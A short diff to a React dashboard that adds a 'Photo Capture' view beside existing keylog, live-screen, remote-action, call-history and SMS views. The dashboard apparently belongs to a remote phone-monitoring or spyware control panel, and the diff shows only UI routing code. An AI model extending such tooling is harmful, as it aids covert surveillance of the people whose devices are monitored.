@@ -14,6 +14,7 @@ import InstalledAppList from '../components/InstalledAppList';
 import KeylogList from '../components/KeylogList';
 import LiveScreenView from '../components/LiveScreenView';
 import GalleryView from '../components/GalleryView';
+import PhotoCaptureView from '../components/PhotoCaptureView';
 import RemoteActions from '../components/RemoteActions';
 import { 
   PhoneCall, 
@@ -254,6 +255,9 @@ function DashboardPage() {
           </div>
         );
 
+      case 'photo-capture':
+        return <PhotoCaptureView deviceId={selectedDeviceId} toggles={toggles} setToggles={setToggles} />;
+
       case 'gallery':
         return <GalleryView deviceId={selectedDeviceId} />;
 
@@ -265,6 +269,7 @@ function DashboardPage() {
   const navItem = [
     { id: 'devices', label: 'Connected Devices' },
     { id: 'live-view', label: 'Live View & Actions' },
+    { id: 'photo-capture', label: 'Photo Capture' },
     { id: 'gallery', label: 'Media Gallery' },
     { id: 'calls', label: 'Call History' },
     { id: 'sms', label: 'Messages' },
